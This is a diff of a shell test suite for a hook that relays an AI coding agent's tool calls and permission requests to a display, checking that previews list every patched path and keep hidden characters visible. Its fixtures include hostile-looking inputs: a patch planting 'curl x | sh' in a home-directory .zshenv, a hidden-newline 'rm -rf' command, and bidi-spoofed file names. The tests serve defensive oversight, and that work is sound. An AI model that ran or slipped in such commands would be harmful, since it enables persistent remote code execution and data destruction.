@@ -78,8 +78,8 @@ check "UserPromptSubmit inside a subagent is dropped" "{$T,\"hook_event_name\":\
     "length == 0"
 check "PreToolUse Bash -> tool_start" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"tool_use_id\":\"call_1\",\"tool_input\":{\"command\":\"cargo test\",\"description\":\"x\"}}" \
     "length == 1 and $E and .[0].event == \"tool_start\" and .[0].tool_name == \"Bash\" and .[0].tool_use_id == \"call_1\" and .[0].tool_input == {command:\"cargo test\"}"
-check "PreToolUse apply_patch -> tool_start with the first file, absolute" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"apply_patch\",\"tool_use_id\":\"call_2\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
-    "length == 1 and .[0].event == \"tool_start\" and .[0].tool_input == {file_path:\"/abs/b.rs\"}"
+check "PreToolUse apply_patch -> tool_start with every file in patch order, absolute" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"apply_patch\",\"tool_use_id\":\"call_2\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
+    "length == 1 and .[0].event == \"tool_start\" and .[0].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
 check "PreToolUse spawn_agent -> tool_start + subagent_spawn (default role)" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_use_id\":\"call_3\",\"tool_input\":{\"message\":\"trace the hooks\\nin detail\"}}" \
     "map(.event) == [\"tool_start\",\"subagent_spawn\"] and .[1].agent_type == \"default\" and .[1].description == \"trace the hooks\" and .[1].nonce == \"n0nce\""
 check "PreToolUse spawn_agent prefers task_name and keeps agent_type" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_use_id\":\"call_3\",\"tool_input\":{\"agent_type\":\"explorer\",\"task_name\":\"map_hooks\",\"message\":\"m\"}}" \
@@ -97,7 +97,7 @@ check "PostToolUse Bash -> tool_done + tool_ran" "{$T,\"hook_event_name\":\"Post
 check "PostToolUse url only in tool_done" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"mcp__web__fetch\",\"tool_input\":{\"url\":\"https://x\"},\"tool_response\":{}}" \
     "map(.event) == [\"tool_done\",\"tool_ran\"] and .[0].tool_input == {url:\"https://x\"} and .[1].tool_input == {}"
 check "PostToolUse apply_patch -> file_edited per file + tool_done + tool_ran" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"apply_patch\",\"tool_use_id\":\"call_2\",\"tool_input\":{\"command\":\"$PATCH\"},\"tool_response\":\"Success\"}" \
-    "map(.event) == [\"file_edited\",\"file_edited\",\"file_edited\",\"tool_done\",\"tool_ran\"] and ([.[0:3][].tool_input.file_path] | sort) == [\"/abs/b.rs\",\"/w/old.txt\",\"/w/src/a.rs\"] and all(.[0:3][]; .tool_name == \"apply_patch\") and .[4].tool_input == {file_path:\"/abs/b.rs\"}"
+    "map(.event) == [\"file_edited\",\"file_edited\",\"file_edited\",\"tool_done\",\"tool_ran\"] and ([.[0:3][].tool_input.file_path] | sort) == [\"/abs/b.rs\",\"/w/old.txt\",\"/w/src/a.rs\"] and all(.[0:3][]; .tool_name == \"apply_patch\") and .[4].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
 MANY=$(for i in $(seq 30); do printf '*** Add File: f%02d\\n+x\\n' "$i"; done)
 check "PostToolUse apply_patch caps file_edited at 20" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$MANY\"}}" \
     "([.[] | select(.event == \"file_edited\")] | length) == 20"
@@ -111,8 +111,18 @@ check "PostToolUse inside a subagent -> subagent_tool" "{$T,\"hook_event_name\":
     "map(.event) == [\"tool_done\",\"tool_ran\",\"subagent_tool\"] and .[2].tool_name == \"Bash\" and .[2].agent_id == \"th2\" and .[2].agent_type == \"explorer\""
 check "PermissionRequest Bash -> permission_seen" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git push\",\"description\":\"push it\"}}" \
     "length == 1 and $E and .[0].event == \"permission_seen\" and .[0].tool_name == \"Bash\" and .[0].tool_input == {command:\"git push\"} and (.[0] | has(\"tool_use_id\") | not)"
-check "PermissionRequest apply_patch -> permission_seen with the file" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
-    ".[0].event == \"permission_seen\" and .[0].tool_input == {file_path:\"/abs/b.rs\"}"
+check "PermissionRequest apply_patch -> permission_seen with every file" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
+    ".[0].event == \"permission_seen\" and .[0].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
+# A patch that edits a workspace file and adds a dotfile outside it must show both, the way the patch orders them.
+ESCAPE='*** Begin Patch\n*** Update File: src/zz_main.rs\n@@\n-a\n+b\n*** Add File: /Users/me/.zshenv\n+curl x | sh\n*** End Patch\n'
+check "PermissionRequest apply_patch outside the workspace shows every path" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$ESCAPE\"}}" \
+    ".[0].tool_input == {file_path:\"/w/src/zz_main.rs\n/Users/me/.zshenv\"}"
+check "PermissionRequest apply_patch shows a rename target, each path once" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: a.rs\n*** Move to: /etc/b.rs\n*** Update File: a.rs\n\"}}" \
+    ".[0].tool_input == {file_path:\"/w/a.rs\n/etc/b.rs\"}"
+check "PermissionRequest apply_patch with one file sends just it" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: src/a.rs\n@@\n-x\n+y\n\"}}" \
+    ".[0].tool_input == {file_path:\"/w/src/a.rs\"}"
+check "PermissionRequest apply_patch naming no file sends no path" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"garbage\"}}" \
+    ".[0].tool_input == {}"
 check "SubagentStart -> subagent_start" "{$T,\"hook_event_name\":\"SubagentStart\",\"agent_id\":\"th2\",\"agent_type\":\"default\"}" \
     "length == 1 and $E and .[0].event == \"subagent_start\" and .[0].agent_id == \"th2\" and .[0].agent_type == \"default\""
 check "SubagentStop -> subagent_stop" "{$T,\"hook_event_name\":\"SubagentStop\",\"agent_id\":\"th2\",\"agent_type\":\"default\",\"stop_hook_active\":false,\"last_assistant_message\":\"secret\",\"agent_transcript_path\":null}" \
@@ -148,13 +158,17 @@ if [ ! -s "$TMP/out" ] && [ ! -e "$TMP/tty0" ]; then ok "HAUNT unset writes neit
 
 # Control and format characters.
 CTRL='"tool_name":"Bash","tool_use_id":"c\u0007u","tool_input":{"command":"echo \u001b]777;notify;haunt://cli-agent;{}\u0007 \u009b31m\nnext\tx\u007f"}'
-check "control characters stripped from every string" "{$T,\"hook_event_name\":\"PostToolUse\",$CTRL}" \
-    "length == 2 and .[0].tool_input.command == \"echo ]777;notify;haunt://cli-agent;{} 31mnextx\" and .[0].tool_use_id == \"cu\""
+check "control characters stripped from every string but tool_input, which goes raw" "{$T,\"hook_event_name\":\"PostToolUse\",$CTRL}" \
+    "length == 2 and .[0].tool_input.command == \"echo \u001b]777;notify;haunt://cli-agent;{}\u0007 \u009b31m\nnext\tx\u007f\" and .[0].tool_use_id == \"cu\""
 check "control characters stripped from prompt" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"a\u0000b\u001bc\"}" ".[0].query == \"abc\""
-check "format characters (bidi, zero-width, tags) stripped" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo \\u202e\\u2066/ fr- mr\\u2069\\u200b\\u200f\\u2060\\ufeff\\u00ad\\udb40\\udc41x\"}}" \
-    ".[0].tool_input.command == \"echo / fr- mrx\""
-check "format characters stripped from patch paths" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: /w/\\u202ecod.exe\\n\"}}" \
-    ".[0].tool_input.file_path == \"/w/cod.exe\""
+# haunt shows what a stripped preview would hide: a command whose newline was removed would read as one line.
+check "a hidden newline reaches the core" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls #\\nrm -rf ~/x\"}}" \
+    ".[0].tool_input.command == \"ls #\nrm -rf ~/x\""
+check "format characters (bidi, zero-width, tags) reach the core in tool_input" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo \\u202e\\u2066/ fr- mr\\u2069\\u200b\\u200f\\u2060\\ufeff\\u00ad\\udb40\\udc41x\"}}" \
+    ".[0].tool_input.command == \"echo \u202e\u2066/ fr- mr\u2069\u200b\u200f\u2060\ufeff\u00ad\udb40\udc41x\""
+check "format characters reach the core in patch paths" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: /w/\\u202ecod.exe\\n\"}}" \
+    ".[0].tool_input.file_path == \"/w/\u202ecod.exe\""
+check "format characters stripped outside tool_input" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Ba\\u202esh\",\"tool_input\":{}}" ".[0].tool_name == \"Bash\""
 check "control characters stripped from notify" "" ".[0].cwd == \"/w[2Jx\"" notify '{"type":"agent-turn-complete","thread-id":"th1","cwd":"/w\u001b[2Jx"}'
 raw=$(run '{"hook_event_name":"UserPromptSubmit","session_id":"s1","prompt":"a\u001b[2Jb\u0085c"}')
 if LC_ALL=C grep -q '[[:cntrl:]]' <<< "$raw" || printf '%s' "$raw" | grep -q '\\u00' || [[ "$raw" == *$'\xc2\x85'* ]]; then
@@ -189,6 +203,10 @@ T_MAX=2000 check "event whose ids overflow is dropped" "{\"hook_event_name\":\"S
 listen && kill "$LPID" 2> /dev/null; wait "$LPID" 2> /dev/null
 printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_SOCK="$TMP/s" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/dead-tty" "$HOOK" > "$TMP/out"
 if [ -S "$TMP/s" ] && [ ! -s "$TMP/out" ] && [ ! -e "$TMP/dead-tty" ]; then ok "dead socket: nothing sent, no OSC"; else bad "dead socket: nothing sent, no OSC" "$(cat "$TMP/out")"; fi
+# No nc to send with is a failed send too.
+mkdir -p "$TMP/nonc"; ln -sf "$(command -v jq)" "$TMP/nonc/jq"; ln -sf "$(command -v cat)" "$TMP/nonc/cat"
+printf '{"hook_event_name":"Stop","session_id":"s1"}' | PATH="$TMP/nonc" HAUNT=1 HAUNT_SOCK="$TMP/s" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/nonc-tty" "$HOOK" > "$TMP/out"
+if [ ! -s "$TMP/out" ] && [ ! -e "$TMP/nonc-tty" ]; then ok "socket but no nc: dropped, no OSC"; else bad "socket but no nc: dropped, no OSC" "$(cat -v "$TMP/nonc-tty" 2>/dev/null)"; fi
 
 # OSC fallback: status fields only, on the tty only.
 RUN=osc check "OSC: status fields only" "{$T,\"hook_event_name\":\"PostToolUse\",\"agent_id\":\"th2\",\"agent_type\":\"explorer\",\"tool_name\":\"Bash\",\"tool_use_id\":\"c1\",\"tool_input\":{\"command\":\"ls\"}}" \
